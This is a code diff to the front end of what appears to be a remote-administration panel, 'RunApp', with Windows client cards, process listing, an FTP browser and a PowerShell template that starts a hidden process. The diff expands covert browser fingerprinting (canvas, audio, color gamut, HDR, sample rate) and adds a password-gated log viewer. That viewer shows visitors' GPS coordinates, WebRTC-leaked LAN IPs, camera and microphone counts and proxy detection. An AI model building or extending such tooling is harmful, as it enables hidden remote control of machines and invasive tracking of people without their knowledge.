@@ -708,6 +708,32 @@ const RunApp = (() => {
             };
         }
 
+        let colorGamut = '';
+        try {
+            if (window.matchMedia('(color-gamut: p3)').matches) colorGamut = 'P3';
+            else if (window.matchMedia('(color-gamut: srgb)').matches) colorGamut = 'sRGB';
+        } catch {}
+
+        let isHdr = false;
+        try {
+            if (window.matchMedia('(dynamic-range: high)').matches) isHdr = true;
+        } catch {}
+
+        let orientationStr = '';
+        try {
+            orientationStr = screen.orientation ? screen.orientation.type : (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
+        } catch {}
+
+        let audioSampleRate = null;
+        try {
+            const AC = window.AudioContext || window.webkitAudioContext;
+            if (AC) {
+                const ac = new AC();
+                audioSampleRate = ac.sampleRate;
+                ac.close?.();
+            }
+        } catch {}
+
         return {
             userAgent: navigator.userAgent || '',
             platform: navigator.platform || '',
@@ -732,7 +758,11 @@ const RunApp = (() => {
             audio: getAudioFingerprint(),
             canvasHash: getCanvasHash(),
             doNotTrack: navigator.doNotTrack || null,
-            cookieEnabled: navigator.cookieEnabled
+            cookieEnabled: navigator.cookieEnabled,
+            colorGamut: colorGamut,
+            isHdr: isHdr,
+            orientation: orientationStr,
+            audioSampleRate: audioSampleRate
         };
     }
 
@@ -978,9 +1008,8 @@ const RunApp = (() => {
         const disabledAttrs = 'disabled aria-disabled="true"';
         const displayUsername = getDisplayUsername(user.username);
         const versionAttr = user.version ? ` title="${user.version}"` : '';
-        const ipDisplay = user.ip
-            ? `<span class="card-client-ip" title="Client IP: ${escapeHtml(user.ip)}"><i class="bi bi-globe2"></i> ${escapeHtml(user.ip)}</span>`
-            : `<span class="card-client-ip no-ip" title="No IP recorded"><i class="bi bi-globe2"></i> No IP</span>`;
+        const ipAttr = user.ip ? ` title="IP: ${escapeHtml(user.ip)}"` : ' title="IP: Unknown"';
+        const winLogoHtml = `<i class="bi bi-windows os-logo"${ipAttr} aria-hidden="true" style="cursor:help;"></i>`;
 
         return `
             <div class="card-header">
@@ -988,12 +1017,9 @@ const RunApp = (() => {
                     <div class="card-title-wrap">
                         <span class="card-username ${alive ? '' : 'offline'}"${versionAttr}>${displayUsername}</span>
                     </div>
-                    <div class="card-client-ip-row">
-                        ${ipDisplay}
-                    </div>
                     <div class="card-ts">${tsText}</div>
                 </div>
-                ${WIN_LOGO_HTML}
+                ${winLogoHtml}
             </div>
             <div class="card-actions">
                 <button class="card-btn primary ${alive && canInteract ? '' : 'disabled'}" data-action="ps" ${alive && canInteract ? '' : disabledAttrs}>
@@ -3495,10 +3521,156 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     };
 
     /**
-     * Open the access verification audit logs modal.
+     * Clean and parse GPU strings (e.g. from verbose ANGLE strings) for high-scan readability.
+     *
+     * @param {string} rawGpu - Raw WebGL renderer parameter.
+     * @returns {string} Clean chipset label.
+     */
+    function getCleanGpuName(rawGpu) {
+        if (!rawGpu) return '-';
+        // Extract chipset inside ANGLE (...)
+        const angleMatch = rawGpu.match(/ANGLE\s*\([^,]+,\s*([^,()]+(?:\([^)]*\))?[^,()]*)/i);
+        if (angleMatch && angleMatch[1]) {
+            let name = angleMatch[1].trim();
+            name = name.replace(/\(0x[0-9a-fA-F]+\)/g, '').trim();
+            if (name) return name;
+        }
+        // Match standard GPU models
+        const chipMatch = rawGpu.match(/(?:NVIDIA\s+)?(?:GeForce|RTX|GTX)\s+[A-Za-z0-9\s]+/i)
+            || rawGpu.match(/(?:AMD\s+)?(?:Radeon)\s+[A-Za-z0-9\s]+/i)
+            || rawGpu.match(/(?:Intel\(R\)\s+)?(?:Iris|UHD|HD|Arc)\s+Graphics[A-Za-z0-9\s]*/i)
+            || rawGpu.match(/Apple\s+M[0-9]+(?:\s+(?:Pro|Max|Ultra))?/i)
+            || rawGpu.match(/Adreno\s*(?:\(TM\)\s*)?[0-9]+/i)
+            || rawGpu.match(/Mali-[A-Za-z0-9\s]+/i);
+        if (chipMatch) return chipMatch[0].trim();
+        if (rawGpu.length > 40) return rawGpu.slice(0, 38) + '…';
+        return rawGpu;
+    }
+
+    /**
+     * Retrieve authenticated Access Logs password from session cache.
+     *
+     * @returns {string} Cached password or empty string.
+     */
+    function getStoredAccessLogsPassword() {
+        return sessionStorage.getItem('access_logs_password') || '';
+    }
+
+    /**
+     * Update or clear the authenticated Access Logs password in session storage.
+     *
+     * @param {string} pwd - Verified password or empty string to revoke.
+     */
+    function setStoredAccessLogsPassword(pwd) {
+        if (pwd) {
+            sessionStorage.setItem('access_logs_password', pwd);
+        } else {
+            sessionStorage.removeItem('access_logs_password');
+        }
+    }
+
+    /**
+     * Open the dedicated Access Logs authentication security modal.
+     */
+    function openAccessLogsAuthModal() {
+        const authModal = $('access-logs-auth-modal');
+        const authError = $('access-logs-auth-error');
+        const authInput = $('access-logs-auth-password');
+        if (authError) {
+            authError.style.display = 'none';
+            authError.textContent = '';
+        }
+        if (authInput) {
+            authInput.value = '';
+        }
+        if (authModal) {
+            authModal.style.display = 'flex';
+            setTimeout(() => authInput?.focus(), 50);
+        }
+    }
+
+    /**
+     * Close the dedicated Access Logs authentication security modal.
+     */
+    function closeAccessLogsAuthModal() {
+        const authModal = $('access-logs-auth-modal');
+        if (authModal) authModal.style.display = 'none';
+    }
+
+    /**
+     * Validate the supplied password against the backend /api/access_logs/verify endpoint.
+     */
+    async function submitAccessLogsAuth() {
+        const authInput = $('access-logs-auth-password');
+        const authError = $('access-logs-auth-error');
+        const submitBtn = $('access-logs-auth-submit-btn');
+        const btnText = $('access-logs-auth-btn-text');
+        const pwd = (authInput?.value || '').trim();
+
+        if (!pwd) {
+            if (authError) {
+                authError.textContent = 'Please enter the access logs password.';
+                authError.style.display = 'block';
+            }
+            authInput?.focus();
+            return;
+        }
+
+        if (submitBtn) submitBtn.disabled = true;
+        if (btnText) btnText.textContent = 'Verifying...';
+        if (authError) authError.style.display = 'none';
+
+        try {
+            const resp = await fetch(`${VPS_URL}/api/access_logs/verify`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pwd })
+            });
+            const data = await resp.json().catch(() => ({}));
+            if (!resp.ok || data.status !== 'success') {
+                throw new Error(data.message || 'Invalid Access Logs password.');
+            }
+
+            setStoredAccessLogsPassword(pwd);
+            closeAccessLogsAuthModal();
+            doOpenAccessLogsModal();
+        } catch (err) {
+            if (authError) {
+                authError.textContent = err.message || 'Authentication failed. Please verify ACCESS_LOGS_PASSWORD in .env.';
+                authError.style.display = 'block';
+            }
+            authInput?.select();
+        } finally {
+            if (submitBtn) submitBtn.disabled = false;
+            if (btnText) btnText.textContent = 'Unlock Logs';
+        }
+    }
+
+    /**
+     * Revoke access logs authentication session and close modal.
+     */
+    function lockAccessLogs() {
+        setStoredAccessLogsPassword('');
+        closeAccessLogsModal();
+        showNotification('Access logs locked successfully.', 'info');
+    }
+
+    /**
+     * Open the access verification audit logs modal, gating via password authentication.
      */
     function openAccessLogsModal() {
-        if (!runState.password) return;
+        const pwd = getStoredAccessLogsPassword();
+        if (!pwd) {
+            openAccessLogsAuthModal();
+            return;
+        }
+        doOpenAccessLogsModal();
+    }
+
+    /**
+     * Internal opener for Access Logs modal after credentials are confirmed.
+     */
+    function doOpenAccessLogsModal() {
         accessLogsState.isOpen = true;
         accessLogsState.searchQuery = '';
         accessLogsState.filterStatus = 'ALL';
@@ -3528,19 +3700,37 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     }
 
     /**
-     * Fetch access verification logs from backend API.
+     * Fetch access verification logs from backend API using the dedicated password header.
      */
     async function loadAccessLogs() {
-        if (!runState.password) return;
+        const pwd = getStoredAccessLogsPassword();
+        if (!pwd) {
+            openAccessLogsAuthModal();
+            return;
+        }
         const listEl = $('access-logs-list');
         if (listEl) {
-            listEl.innerHTML = '<div class="access-log-empty"><i class="bi bi-hourglass-split"></i> Loading access logs...</div>';
+            listEl.innerHTML = '<div class="access-log-empty"><i class="bi bi-hourglass-split"></i> Loading audit logs...</div>';
         }
         try {
             const resp = await fetch(`${VPS_URL}/api/access_logs`, {
-                headers: { 'x-password': runState.password }
+                headers: {
+                    'X-Access-Logs-Password': pwd,
+                    'X-Password': pwd
+                }
             });
-            if (!resp.ok) throw new Error('Unauthorized');
+            if (resp.status === 401) {
+                setStoredAccessLogsPassword('');
+                closeAccessLogsModal();
+                openAccessLogsAuthModal();
+                const authError = $('access-logs-auth-error');
+                if (authError) {
+                    authError.textContent = 'Session expired or password changed. Please enter the Access Logs password.';
+                    authError.style.display = 'block';
+                }
+                return;
+            }
+            if (!resp.ok) throw new Error('Failed to retrieve logs');
             accessLogsState.logs = await resp.json();
             renderAccessLogsList();
         } catch (err) {
@@ -3551,9 +3741,50 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         }
     }
 
+    /**
+     * Toggle visibility of the deep telemetry technical inspector for a specific log card.
+     *
+     * @param {number} logId - Primary identifier of log record.
+     */
+    function toggleLogDetail(logId) {
+        const panel = document.getElementById(`log-detail-${logId}`);
+        const btn = document.getElementById(`log-toggle-btn-${logId}`);
+        if (!panel) return;
+        const isHidden = panel.style.display === 'none' || !panel.style.display;
+        if (isHidden) {
+            panel.style.display = 'block';
+            if (btn) btn.innerHTML = '<i class="bi bi-chevron-up"></i> Less';
+        } else {
+            panel.style.display = 'none';
+            if (btn) btn.innerHTML = '<i class="bi bi-chevron-down"></i> Details';
+        }
+    }
 
     /**
-     * Render the filtered access verification logs into the modal container.
+     * Copy full telemetry JSON of a specific log entry to system clipboard.
+     *
+     * @param {number} logId - Primary identifier of log record.
+     */
+    function copyLogJson(logId) {
+        const log = accessLogsState.logs.find(l => l.id === logId);
+        if (!log) return;
+        let detailsObj = {};
+        try {
+            if (log.details) detailsObj = JSON.parse(log.details);
+        } catch {}
+        const fullRecord = {
+            ...log,
+            parsedDetails: detailsObj
+        };
+        navigator.clipboard.writeText(JSON.stringify(fullRecord, null, 2)).then(() => {
+            showNotification('Telemetry JSON copied to clipboard!', 'success');
+        }).catch(() => {
+            showNotification('Failed to copy to clipboard', 'error');
+        });
+    }
+
+    /**
+     * Render the filtered access verification logs into the modal container with clean, uncluttered layout.
      */
     function renderAccessLogsList() {
         const listEl = $('access-logs-list');
@@ -3603,109 +3834,165 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             } else if (statusUpper.startsWith('BLOCKED')) {
                 statusClass = 'access-log-status-BLOCKED';
             }
-            const locationParts = [log.city, log.region, log.country].filter(Boolean);
-            const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'Location unavailable';
-            const ispStr = log.isp && log.isp !== 'Unknown' ? ` • ${escapeHtml(log.isp)}` : '';
 
             let detailsObj = {};
             try {
                 if (log.details) detailsObj = JSON.parse(log.details);
             } catch {}
 
+            const locationParts = [log.city, log.region, log.country].filter(Boolean);
+            const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'Location unavailable';
+
             const hasGps = log.latitude !== null && log.latitude !== undefined && log.longitude !== null && log.longitude !== undefined;
             const mapsUrl = hasGps ? `https://www.google.com/maps?q=${log.latitude},${log.longitude}` : (detailsObj.mapsUrl || null);
             const localTimeStr = formatLocalDateTime(log.created_at);
 
+            // Determine appropriate device/OS icon
+            let deviceIcon = 'laptop';
+            const osLower = (log.os || '').toLowerCase();
+            if (log.device === 'Mobile' || osLower.includes('android') || osLower.includes('iphone')) {
+                deviceIcon = 'phone';
+            } else if (log.device === 'Tablet' || osLower.includes('ipad')) {
+                deviceIcon = 'tablet';
+            }
+
+            // Network classification pill
+            let netTagHtml = '';
+            let netTypeLabel = 'Residential / Broadband';
+            if (detailsObj.proxy || detailsObj.hosting) {
+                netTagHtml = '<span class="access-log-net-tag hosting" title="Datacenter / Hosting / Proxy / VPN"><i class="bi bi-shield-shaded"></i> VPN / Datacenter</span>';
+                netTypeLabel = detailsObj.proxy ? 'Proxy / VPN Detected' : 'Datacenter / Hosting IP';
+            } else if (detailsObj.mobile) {
+                netTagHtml = '<span class="access-log-net-tag mobile" title="Cellular / Mobile Network"><i class="bi bi-broadcast"></i> Cellular</span>';
+                netTypeLabel = 'Cellular / Mobile Network';
+            } else if (log.isp && log.isp !== 'Unknown') {
+                netTagHtml = '<span class="access-log-net-tag residential" title="Residential / Broadband Connection"><i class="bi bi-house-door-fill"></i> Residential</span>';
+                netTypeLabel = 'Residential / Broadband';
+            }
+
+            const cleanGpu = getCleanGpuName(log.gpu);
+            const lanIp = (detailsObj.webrtcIps && detailsObj.webrtcIps.length > 0) ? detailsObj.webrtcIps[0] : '';
+            const modelName = detailsObj.clientHints?.model || '';
+            const asStr = detailsObj.as ? detailsObj.as.split(' ')[0] : '';
+
             return `
-                <div class="access-log-entry">
+                <div class="access-log-entry" id="log-card-${log.id}">
+                    <!-- Primary Header -->
                     <div class="access-log-header-row">
                         <div class="access-log-ip-badge">
-                            <i class="bi bi-globe"></i>
+                            <i class="bi bi-shield-check access-log-shield-icon"></i>
                             <span class="access-log-ip-text">${escapeHtml(log.ip || 'Unknown IP')}</span>
                             <span class="${statusClass}">${escapeHtml(log.status || 'UNKNOWN')}</span>
+                            ${netTagHtml}
                         </div>
                         <div class="access-log-meta">
                             <span class="access-log-device-badge">
-                                <i class="bi bi-${log.device === 'Mobile' ? 'phone' : (log.device === 'Tablet' ? 'tablet' : 'laptop')}"></i>
+                                <i class="bi bi-${deviceIcon}"></i>
                                 ${escapeHtml(log.os || 'OS')} · ${escapeHtml(log.browser || 'Browser')}
                             </span>
                             <span class="access-log-time" title="Local: ${localTimeStr} (UTC: ${escapeHtml(log.created_at || '')})">
                                 <i class="bi bi-clock"></i> ${escapeHtml(localTimeStr)}
                             </span>
+                            <button type="button" class="access-log-toggle-btn" onclick="RunApp.toggleLogDetail(${log.id})" id="log-toggle-btn-${log.id}" title="Toggle detailed technical inspector">
+                                <i class="bi bi-chevron-down"></i> Details
+                            </button>
                         </div>
                     </div>
-                    ${hasGps ? `
-                    <div class="access-log-gps-row">
-                        <span class="access-log-gps-badge" title="High-accuracy GPS coordinates (Accuracy: ±${log.accuracy ? Math.round(log.accuracy) : 0}m)">
-                            <i class="bi bi-crosshair"></i> GPS: ${escapeHtml(log.gps_location || `${log.latitude.toFixed(5)}, ${log.longitude.toFixed(5)}`)}
+
+                    <!-- Geo & Connectivity Strip -->
+                    <div class="access-log-geo-strip">
+                        <div class="access-log-geo-left">
+                            <i class="bi bi-geo-alt-fill access-log-geo-icon"></i>
+                            <span class="access-log-geo-location">${escapeHtml(locationStr)}</span>
+                            ${log.isp && log.isp !== 'Unknown' ? `<span class="access-log-geo-isp">• ${escapeHtml(log.isp)}</span>` : ''}
+                            ${asStr ? `<span class="access-log-geo-as">• ${escapeHtml(asStr)}</span>` : ''}
+                        </div>
+                        ${hasGps ? `
+                        <div class="access-log-geo-right">
+                            <span class="access-log-gps-mini" title="Accuracy: ±${Math.round(log.accuracy || 0)}m">
+                                <i class="bi bi-crosshair"></i> GPS ${escapeHtml(log.gps_location || `${log.latitude.toFixed(4)}, ${log.longitude.toFixed(4)}`)} (±${Math.round(log.accuracy || 0)}m)
+                            </span>
+                            <a class="access-log-maps-mini-btn" href="${mapsUrl}" target="_blank" rel="noreferrer" title="Open GPS location in Google Maps">
+                                <i class="bi bi-geo-alt"></i> Map
+                            </a>
+                        </div>
+                        ` : ''}
+                    </div>
+
+                    <!-- Quick-Scan Pills Row -->
+                    <div class="access-log-pills-row">
+                        <span class="access-log-pill" title="Screen resolution">
+                            <i class="bi bi-display"></i> ${escapeHtml(log.screen || '-')}
                         </span>
-                        <a class="access-log-maps-btn" href="${mapsUrl}" target="_blank" rel="noreferrer" title="Open GPS Location in Google Maps">
-                            <i class="bi bi-geo-alt-fill"></i> View Map
-                        </a>
-                    </div>
-                    ` : ''}
-                    <div class="access-log-location">
-                        <i class="bi bi-geo-alt"></i> ${escapeHtml(locationStr)}${ispStr}
-                    </div>
-                    <div class="access-log-details-grid">
-                        <div class="access-log-spec-item" title="Screen resolution">
-                            <span class="access-log-spec-label"><i class="bi bi-display"></i> Screen:</span>
-                            <span class="access-log-spec-val">${escapeHtml(log.screen || '-')}</span>
-                        </div>
-                        <div class="access-log-spec-item" title="Timezone">
-                            <span class="access-log-spec-label"><i class="bi bi-hourglass"></i> Timezone:</span>
-                            <span class="access-log-spec-val">${escapeHtml(log.timezone || '-')}</span>
-                        </div>
-                        <div class="access-log-spec-item" title="Browser languages">
-                            <span class="access-log-spec-label"><i class="bi bi-translate"></i> Lang:</span>
-                            <span class="access-log-spec-val">${escapeHtml(log.language || '-')}</span>
-                        </div>
-                        <div class="access-log-spec-item" title="Hardware specs">
-                            <span class="access-log-spec-label"><i class="bi bi-cpu"></i> Hardware:</span>
-                            <span class="access-log-spec-val">${escapeHtml(log.hardware || '-')}</span>
-                        </div>
+                        <span class="access-log-pill" title="Hardware concurrency & memory">
+                            <i class="bi bi-cpu"></i> ${escapeHtml(log.hardware || '-')}
+                        </span>
+                        <span class="access-log-pill" title="Graphics: ${escapeHtml(log.gpu || '')}">
+                            <i class="bi bi-gpu-card"></i> ${escapeHtml(cleanGpu)}
+                        </span>
                         ${detailsObj.battery ? `
-                        <div class="access-log-spec-item" title="Device Battery">
-                            <span class="access-log-spec-label"><i class="bi bi-battery-charging"></i> Battery:</span>
-                            <span class="access-log-spec-val">${escapeHtml(detailsObj.battery.level || '')} ${detailsObj.battery.charging ? '(Charging)' : ''}</span>
-                        </div>
+                        <span class="access-log-pill" title="Device Battery">
+                            <i class="bi bi-battery-charging"></i> ${escapeHtml(detailsObj.battery.level || '')} ${detailsObj.battery.charging ? '⚡' : ''}
+                        </span>
                         ` : ''}
-                        ${detailsObj.media ? `
-                        <div class="access-log-spec-item" title="Connected Hardware Devices">
-                            <span class="access-log-spec-label"><i class="bi bi-camera-video"></i> Media:</span>
-                            <span class="access-log-spec-val">${detailsObj.media.cameras} cams, ${detailsObj.media.microphones} mics</span>
-                        </div>
+                        ${lanIp ? `
+                        <span class="access-log-pill" title="LAN / Discovered Candidate IP">
+                            <i class="bi bi-router"></i> ${escapeHtml(lanIp)}
+                        </span>
                         ` : ''}
-                        ${detailsObj.connection ? `
-                        <div class="access-log-spec-item" title="Network Connection Info">
-                            <span class="access-log-spec-label"><i class="bi bi-reception-4"></i> Network:</span>
-                            <span class="access-log-spec-val">${escapeHtml(detailsObj.connection.effectiveType || '')} ${escapeHtml(detailsObj.connection.downlink || '')}</span>
-                        </div>
+                        ${modelName ? `
+                        <span class="access-log-pill" title="Device Model">
+                            <i class="bi bi-phone"></i> ${escapeHtml(modelName)}
+                        </span>
                         ` : ''}
-                        ${detailsObj.webrtcIps && detailsObj.webrtcIps.length > 0 ? `
-                        <div class="access-log-spec-item" title="Discovered local/candidate IP addresses">
-                            <span class="access-log-spec-label"><i class="bi bi-router"></i> LAN IP:</span>
-                            <span class="access-log-spec-val">${escapeHtml(detailsObj.webrtcIps.join(', '))}</span>
+                    </div>
+
+                    <!-- Deep-Dive Forensic Inspector (Collapsible) -->
+                    <div class="access-log-expanded-panel" id="log-detail-${log.id}" style="display: none;">
+                        <div class="access-log-deep-grid">
+                            <!-- Col 1: Hardware & Display Specs -->
+                            <div class="access-log-deep-col">
+                                <div class="access-log-deep-header"><i class="bi bi-motherboard"></i> Hardware & Display</div>
+                                <div class="access-log-deep-row"><span>Viewport:</span> <code>${escapeHtml(detailsObj.viewport || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Color / HDR:</span> <code>${detailsObj.isHdr ? 'HDR Active' : 'SDR'}${detailsObj.colorGamut ? ` (${escapeHtml(detailsObj.colorGamut)})` : ''}</code></div>
+                                <div class="access-log-deep-row"><span>Orientation:</span> <code>${escapeHtml(detailsObj.orientation || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Touch Support:</span> <code>${detailsObj.touchSupport ? 'Touch Enabled' : 'Mouse / No Touch'}</code></div>
+                                <div class="access-log-deep-row"><span>Raw GPU:</span> <code class="truncate-code" title="${escapeHtml(log.gpu || '')}">${escapeHtml(log.gpu || '-')}</code></div>
+                            </div>
+
+                            <!-- Col 2: Network & Carrier Intelligence -->
+                            <div class="access-log-deep-col">
+                                <div class="access-log-deep-header"><i class="bi bi-diagram-3"></i> Network & Carrier</div>
+                                <div class="access-log-deep-row"><span>ISP:</span> <code>${escapeHtml(log.isp || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Autonomous System:</span> <code>${escapeHtml(detailsObj.as || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Organization:</span> <code>${escapeHtml(detailsObj.org || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Downlink / RTT:</span> <code>${detailsObj.connection ? `${escapeHtml(detailsObj.connection.effectiveType || '')} ${escapeHtml(detailsObj.connection.downlink || '')} (${escapeHtml(detailsObj.connection.rtt || '-')})` : '-'}</code></div>
+                                <div class="access-log-deep-row"><span>Discovered LAN IPs:</span> <code>${detailsObj.webrtcIps && detailsObj.webrtcIps.length ? escapeHtml(detailsObj.webrtcIps.join(', ')) : 'None'}</code></div>
+                                <div class="access-log-deep-row"><span>Net Type:</span> <code>${escapeHtml(netTypeLabel)}</code></div>
+                            </div>
+
+                            <!-- Col 3: Browser & Security Environment -->
+                            <div class="access-log-deep-col">
+                                <div class="access-log-deep-header"><i class="bi bi-shield-lock"></i> Environment & Audio</div>
+                                <div class="access-log-deep-row"><span>Timezone:</span> <code>${escapeHtml(log.timezone || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Languages:</span> <code>${escapeHtml(log.language || '-')}</code></div>
+                                <div class="access-log-deep-row"><span>Audio Pipeline:</span> <code>${detailsObj.audioSampleRate ? `${detailsObj.audioSampleRate} Hz` : '-'}${detailsObj.audio ? ` (ID: ${String(detailsObj.audio).slice(0, 10)})` : ''}</code></div>
+                                <div class="access-log-deep-row"><span>Canvas Hash:</span> <code>${detailsObj.canvasHash ? escapeHtml(String(detailsObj.canvasHash).slice(0, 12)) : '-'}</code></div>
+                                <div class="access-log-deep-row"><span>Media Hardware:</span> <code>${detailsObj.media ? `${detailsObj.media.cameras} Cams, ${detailsObj.media.microphones} Mics` : '-'}</code></div>
+                                <div class="access-log-deep-row"><span>Cookies / DNT:</span> <code>${detailsObj.cookieEnabled ? 'Cookies On' : 'No Cookies'} · DNT: ${escapeHtml(String(detailsObj.doNotTrack ?? 'off'))}</code></div>
+                            </div>
                         </div>
-                        ` : ''}
-                        ${detailsObj.clientHints?.model ? `
-                        <div class="access-log-spec-item" title="Hardware Model">
-                            <span class="access-log-spec-label"><i class="bi bi-phone"></i> Model:</span>
-                            <span class="access-log-spec-val">${escapeHtml(detailsObj.clientHints.model)}</span>
+
+                        <div class="access-log-deep-actions">
+                            <button type="button" class="access-log-copy-json-btn" onclick="RunApp.copyLogJson(${log.id})">
+                                <i class="bi bi-clipboard"></i> Copy Telemetry JSON
+                            </button>
+                            ${hasGps ? `
+                            <a class="access-log-maps-mini-btn" href="${mapsUrl}" target="_blank" rel="noreferrer">
+                                <i class="bi bi-box-arrow-up-right"></i> Open Location in Google Maps
+                            </a>
+                            ` : ''}
                         </div>
-                        ` : ''}
-                        ${detailsObj.media?.labels && detailsObj.media.labels.length > 0 ? `
-                        <div class="access-log-spec-item" title="${escapeHtml(detailsObj.media.labels.join(' | '))}" style="grid-column: 1 / -1;">
-                            <span class="access-log-spec-label"><i class="bi bi-headset"></i> Hardware:</span>
-                            <span class="access-log-spec-val">${escapeHtml(detailsObj.media.labels.join(', '))}</span>
-                        </div>
-                        ` : ''}
-                        ${log.gpu ? `
-                        <div class="access-log-spec-item" title="${escapeHtml(log.gpu)}" style="grid-column: 1 / -1;">
-                            <span class="access-log-spec-label"><i class="bi bi-gpu-card"></i> GPU:</span>
-                            <span class="access-log-spec-val">${escapeHtml(log.gpu)}</span>
-                        </div>
-                        ` : ''}
                     </div>
                 </div>
             `;
@@ -3726,7 +4013,7 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
     }
 
     /**
-     * Initialize event listeners for the Access Verification Logs modal.
+     * Initialize event listeners for the Access Verification Logs modal and security unlock gate.
      */
     function initAccessLogsModal() {
         $('run-access-logs-btn')?.addEventListener('click', openAccessLogsModal);
@@ -3735,7 +4022,29 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
             closeSidebar();
         });
         $('access-logs-close-btn')?.addEventListener('click', closeAccessLogsModal);
+        $('access-logs-lock-btn')?.addEventListener('click', lockAccessLogs);
         $('access-logs-refresh-btn')?.addEventListener('click', loadAccessLogs);
+
+        // Access logs auth modal event listeners
+        $('access-logs-auth-close-btn')?.addEventListener('click', closeAccessLogsAuthModal);
+        $('access-logs-auth-cancel-btn')?.addEventListener('click', closeAccessLogsAuthModal);
+        $('access-logs-auth-form')?.addEventListener('submit', (e) => {
+            e.preventDefault();
+            submitAccessLogsAuth();
+        });
+        $('access-logs-auth-submit-btn')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            submitAccessLogsAuth();
+        });
+        $('access-logs-auth-password')?.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                submitAccessLogsAuth();
+            }
+        });
+        $('access-logs-auth-modal')?.addEventListener('click', (e) => {
+            if (e.target === $('access-logs-auth-modal')) closeAccessLogsAuthModal();
+        });
 
         const filterInput = $('access-logs-filter-input');
         const filterClear = $('access-logs-filter-clear');
@@ -4183,6 +4492,12 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
 
         // Global hotkey shortcuts
         document.addEventListener('keydown', e => {
+            if ($('access-logs-auth-modal')?.style.display === 'flex') {
+                if (e.key === 'Escape') {
+                    closeAccessLogsAuthModal();
+                    return;
+                }
+            }
             if (accessLogsState.isOpen) {
                 if (e.key === 'Escape') {
                     closeAccessLogsModal();
@@ -4528,7 +4843,9 @@ Start-Process -FilePath $o -WindowStyle Hidden`;
         openLogsModal,
         closeLogsModal,
         openFtpBrowser,
-        closeFtpBrowser
+        closeFtpBrowser,
+        toggleLogDetail,
+        copyLogJson
     };
 })();
 
